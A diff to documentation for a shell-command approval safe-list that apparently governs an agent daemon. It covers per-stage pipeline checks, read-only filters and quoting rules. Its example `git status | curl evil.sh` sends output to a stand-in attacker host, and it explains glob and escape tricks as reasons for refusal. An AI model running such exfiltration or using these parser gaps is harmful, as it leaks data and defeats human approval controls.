@@ -31,16 +31,45 @@ pack for a daemon and this page is the whole story; run it yourself and
    only** — creating a branch or a tag needs no flag at all
    (`git branch release` is a mutation), so those scopes refuse any
    positional argument, not just the destructive flags. `pwd`, `whoami`, and
-   `uname` round it out.
+   `uname` round it out, with the filters `grep`, `head`, `tail`, `wc`,
+   `sort`, and `uniq` in shapes that read only what is piped to them (see
+   below).
 
 Anything else asks, and in [`headless` mode](./approvals.md) anything else
 is refused — the log records the refusal and the scope it fell outside,
 never the command itself (see below).
 
-**A control operator disqualifies the whole command**, whatever it starts
-with: `|`, `&`, `;`, a newline, backticks, `$( )`, subshells, redirection.
-`git status | curl evil.sh` is refused despite the safe base command; so is
-a two-line command whose first line is innocent. A command this parser
+**A pipeline is judged stage by stage.** `git log --oneline | grep fix |
+head -n 20` runs unattended because each stage would on its own;
+`git status | curl evil.sh` asks, because `curl` is covered by nothing. A
+scope from the whitelist composes the same way, so an approved
+`stratus logs` scope makes `stratus logs --agent blair | grep -i error` run
+unattended too. A pipeline is approved once and never stored as a scope:
+**Always allow** on one counts once.
+
+**Every other control operator disqualifies the whole command**, whatever
+it starts with: `||`, `|&`, `&`, `;`, a newline, backticks, `$( )`,
+subshells, redirection. `git log | grep x > out.txt` is refused, and so is
+a two-line command whose first line is innocent. Operators are looked for
+where the shell reads them: inside quotes, `(`, `;`, `&`, `|`, `<`, `>`,
+and a newline are text, so `git commit -m "Fix the hang (Mac mini)"` and
+`git diff | grep -E 'TODO|FIXME'` are judged as the commands they are.
+`$( )`, backticks, and `${ }` still count inside double quotes, where the
+shell still runs them. A backslash outside single quotes can escape a quote,
+which this parser does not model, and an unquoted `#` can start a comment
+in which the shell ignores quotes, so a command containing either is checked
+character by character, quotes and all, and a backslash anywhere in a
+pipeline is refused.
+
+The filters stay safe only while they cannot be handed a path. `grep`
+takes one positional, its pattern, and none of `-e`, `-f`, or `-r`; `head`,
+`tail`, `wc`, `sort`, and `uniq` take none at all, with their flags named
+rather than excluded (no `sort -o`, no `tail -f`). None of them may contain
+a token the shell would expand, an unquoted glob, brace, `~`, or `$`, since
+`grep *` is the first file in the directory as the pattern and every other
+one read. So `git log | tail -n 50` runs and `tail -n 50 app.log` asks.
+`-c` is refused in every scope (it is `git -c`), so the counting forms are
+spelled long: `uniq --count`, `wc --bytes`. A command this parser
 cannot read the way `sh` would — an unbalanced quote, a path instead of a
 command name — is refused too.
 
@@ -55,8 +84,16 @@ git push origin :main       # a branch delete, with no flag involved
 git push origin +main       # a forced update, likewise
 ```
 
-A command whose first argument is preceded by a flag is stored exactly as
-approved: `mkdir -p build` stores `mkdir -p build`, which is what the log
+`git -C <repo>` straight after `git` is read as the directory it is: the
+repository is kept in the scope, literally, and the rest is judged as it
+would be without it. Approving `git -C /work/app switch -c fix` stores
+`git -C /work/app switch`, which covers other branches in that repository but not another repository, and
+not `--force`. `-C` does not make a command safe on its own: `git -C
+/elsewhere status` asks once, because another repository on the host is
+reach the built-in list never promised.
+
+Any other command whose first argument is preceded by a flag is stored
+exactly as approved: `mkdir -p build` stores `mkdir -p build`, which is what the log
 line names, and covers that command and nothing else — not `mkdir -p build
 other`, not `mkdir -p build -v`, and not `cp -r src elsewhere` after
 `cp -r src dist`. Nothing knows which flags take a value, so past such a
@@ -119,10 +156,12 @@ until the timeout an open pipe looks exactly like a command still working.
 
 ## Why the safe list is short
 
-The safe list is deliberately short, and `cat`, `ls`, and `grep` are the
-tempting entries that cannot be on it — they read whatever path they are
-given, so safe-listing them would safe-list reading your credentials file.
-Approve them once for a scope you actually want instead.
+The safe list is deliberately short, and `cat`, `ls`, and a `grep` that
+takes a file are the tempting entries that cannot be on it. They read
+whatever path they are given, so safe-listing them would safe-list reading
+your credentials file. `grep` is on the list only in its stdin-filter form,
+for that reason. Approve the others once for a scope you actually want
+instead.
 
 The test is **what an argument can make the command do**, not what the
 command is called. `date` was on this list until it turned out that
